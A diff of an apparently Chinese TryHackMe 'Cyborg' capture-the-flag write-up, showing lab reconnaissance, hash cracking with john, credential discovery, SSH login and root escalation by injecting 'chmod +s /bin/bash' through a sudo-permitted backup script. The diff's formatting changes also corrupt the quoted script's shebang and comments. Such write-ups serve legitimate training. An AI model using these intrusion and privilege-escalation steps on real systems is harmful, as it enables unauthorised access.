@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/Cyborg]
-└─# nmap -sV -Pn 10.10.56.66
+└─#  nmap -sV -Pn 10.10.56.66
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 10:32 EDT
 Nmap scan report for 10.10.56.66
@@ -17,10 +17,10 @@ Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
 ```
 
 
-#爆破目录
+# 爆破目录
 ```
 ┌──(root💀kali)-[~/tryhackme/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.56.66 -e*
+└─#  python3 dirsearch.py -u http://10.10.56.66 -e*
 
   _|. _ _  _  _  _ _|_    v0.4.2                                             
  (_||| _) (/_(_|| (_| )                                                      
@@ -57,7 +57,7 @@ Target: http://10.10.56.66/
 保存到本地，用john破解
 ```
 ┌──(root💀kali)-[~/tryhackme/Cyborg]
-└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+└─#  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 Created directory: /root/.john
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 Use the "--format=md5crypt-long" option to force loading these as that type instead
@@ -76,7 +76,7 @@ Session completed
 在首页dowmload一个压缩包```archiver.tar```，解压后得到几个文件
 ```
 ┌──(root💀kali)-[~/…/home/field/dev/final_archive]
-└─# ls
+└─#  ls
 config  data  hints.5  index.5  integrity.5  nonce  README
                                                                                                                                                                                                                                              
 ```
@@ -86,11 +86,11 @@ config  data  hints.5  index.5  integrity.5  nonce  README
 在kali本地安装brog以后，使用上面的密码析出文件一个```home```文件
 ```
 ┌──(root💀kali)-[~/…/Cyborg/home/field/dev]
-└─# borg extract ./final_archive::music_archive
+└─#  borg extract ./final_archive::music_archive
 Enter passphrase for key /root/tryhackme/Cyborg/home/field/dev/final_archive: 
                                                                                                                                                                                                                                              
 ┌──(root💀kali)-[~/…/Cyborg/home/field/dev]
-└─# ls
+└─#  ls
 final_archive  home
 
 ```
@@ -98,7 +98,7 @@ final_archive  home
 找到alex的登录凭证：
 ```
 ┌──(root💀kali)-[~/…/dev/home/alex/Documents]
-└─# cat note.txt  
+└─#  cat note.txt  
 Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
 
 alex:S3cretP@s3
@@ -106,10 +106,10 @@ alex:S3cretP@s3
 ```
 
 
-#登录alex账号，拿到user flag
+# 登录alex账号，拿到user flag
 ```
 ┌──(root💀kali)-[~/tryhackme/Cyborg]
-└─# ssh alex@10.10.56.66                                                                                                                                                                                                                130 ⨯
+└─#  ssh alex@10.10.56.66                                                                                                                                                                                                                130 ⨯
 alex@10.10.56.66's password: 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)
 
@@ -135,7 +135,7 @@ alex@ubuntu:~$ cat user.txt
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 ```
 
-#查看本账户root权限
+# 查看本账户root权限
 ```
 alex@ubuntu:~$ sudo -l
 Matching Defaults entries for alex on ubuntu:
@@ -150,19 +150,19 @@ User alex may run the following commands on ubuntu:
 
 ```
 alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
-#!/bin/bash
+# !/bin/bash
 
 sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
 
 
 input="/etc/mp3backups/backed_up_files.txt"
-#while IFS= read -r line
-#do
-  #a="/etc/mp3backups/backed_up_files.txt"
-#  b=$(basename $input)
-  #echo
-#  echo "$line"
-#done < "$input"
+# while IFS= read -r line
+# do
+  # a="/etc/mp3backups/backed_up_files.txt"
+#   b=$(basename $input)
+  # echo
+#   echo "$line"
+# done < "$input"
 
 while getopts c: flag
 do
@@ -175,22 +175,22 @@ done
 
 backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
 
-# Where to backup to.
+#  Where to backup to.
 dest="/etc/mp3backups/"
 
-# Create archive filename.
+#  Create archive filename.
 hostname=$(hostname -s)
 archive_file="$hostname-scheduled.tgz"
 
-# Print start status message.
+#  Print start status message.
 echo "Backing up $backup_files to $dest/$archive_file"
 
 echo
 
-# Backup the files using tar.
+#  Backup the files using tar.
 tar czf $dest/$archive_file $backup_files
 
-# Print end status message.
+#  Print end status message.
 echo
 echo "Backup finished"
 
@@ -228,9 +228,9 @@ root
 ```
 sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
 alex@ubuntu:~/Music$ bash -p
-bash-4.3# whoami
+bash-4.3#  whoami
 root
-bash-4.3# cat /root/root.txt 
+bash-4.3#  cat /root/root.txt 
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
 ```
 
